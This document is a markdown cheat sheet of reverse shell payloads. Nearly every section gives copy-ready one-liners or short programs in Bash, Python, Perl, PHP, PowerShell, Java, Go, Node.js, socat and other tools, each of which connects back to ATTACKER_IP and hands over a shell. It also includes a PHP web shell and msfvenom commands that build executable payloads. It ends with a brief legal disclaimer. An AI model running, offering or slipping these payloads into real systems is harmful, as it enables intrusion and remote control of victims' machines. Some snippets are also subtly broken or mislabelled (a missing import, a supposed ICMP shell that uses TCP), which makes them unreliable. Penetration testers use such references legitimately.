# Reverse Shell Payload Cheat Sheet

This document contains reverse shell payloads for various scripting languages, organized from basic to advanced techniques.

## Table of Contents
1. [Bash](#bash)
2. [Python](#python)
3. [Perl](#perl)
4. [PHP](#php)
5. [Ruby](#ruby)
6. [Netcat](#netcat)
7. [PowerShell](#powershell)
8. [Java](#java)
9. [Golang](#golang)
10. [Node.js](#nodejs)
11. [Awk](#awk)
12. [Telnet](#telnet)
13. [Socat](#socat)
14. [Windows CMD](#windows-cmd)
15. [Lua](#lua)
16. [Advanced Techniques](#advanced-techniques)

---

## Bash

### Basic
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### Without /dev/tcp
```bash
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Using UDP
```bash
sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

---

## Python

### Basic
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### With SSL
```python
python -c 'import socket,subprocess,ssl;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));ss=ssl.wrap_socket(s);os.dup2(ss.fileno(),0); os.dup2(ss.fileno(),1); os.dup2(ss.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Perl

### Basic
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Without /bin/sh
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## PHP

### Basic
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### With proc_open
```php
php -r '$s=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
```

### Web Shell
```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
```

---

## Ruby

### Basic
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Alternative
```ruby
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP","PORT");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec("/bin/sh -i")'
```

---

## Netcat

### Basic
```bash
nc -e /bin/sh ATTACKER_IP PORT
```

### Without -e
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### BusyBox
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|busybox nc ATTACKER_IP PORT >/tmp/f
```

---

## PowerShell

### Basic
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Encoded
```powershell
powershell -nop -enc "BASE64_ENCODED_SCRIPT"
```

---

## Java

### Basic
```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

### Alternative
```java
String host="ATTACKER_IP";
int port=PORT;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

---

## Golang

### Basic
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

## Node.js

### Basic
```javascript
require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')
```

### Alternative
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(PORT, "ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents Node.js from exiting
})();
```

---

## Awk

### Basic
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## Telnet

### Basic
```bash
TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | bash 1>$TF
```

---

## Socat

### Basic
```bash
socat TCP:ATTACKER_IP:PORT EXEC:/bin/sh
```

### With TTY
```bash
socat TCP:ATTACKER_IP:PORT EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
```

### SSL Encrypted
```bash
socat OPENSSL:ATTACKER_IP:PORT EXEC:/bin/sh
```

---

## Windows CMD

### Basic
```cmd
cmd.exe /c powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Lua

### Basic
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

## Advanced Techniques

### ICMP Reverse Shell
```bash
sudo bash -c 'bash -i > /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1 &' && ping -c 1 ATTACKER_IP
```

### DNS Exfiltration
```bash
while true; do host $(bash -c 'read -p "shell> " cmd && echo $cmd' | base64).ATTACKER_IP; done
```

### WebSocket Reverse Shell
```javascript
// Node.js WebSocket shell
const WebSocket = require('ws');
const ws = new WebSocket('ws://ATTACKER_IP:PORT');
const { exec } = require('child_process');

ws.on('open', () => {
    ws.send('Connected');
});

ws.on('message', (data) => {
    exec(data.toString(), (error, stdout, stderr) => {
        if (error) ws.send(error.message);
        if (stderr) ws.send(stderr);
        ws.send(stdout);
    });
});
```

### Metasploit Payloads
```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
```

### Polyglot Payloads
```python
# Python/Bash polyglot
echo 'import os; os.system("""bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\'""")' > shell.py && python shell.py
```

---

## Important Notes

1. Replace `ATTACKER_IP` and `PORT` with your listener details
2. Some payloads may require specific dependencies or environments
3. Always test payloads in controlled environments
4. Many modern systems have protections against reverse shells
5. Consider using encryption for production use (SSL/TLS)

**Legal Disclaimer**: Only use these techniques on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.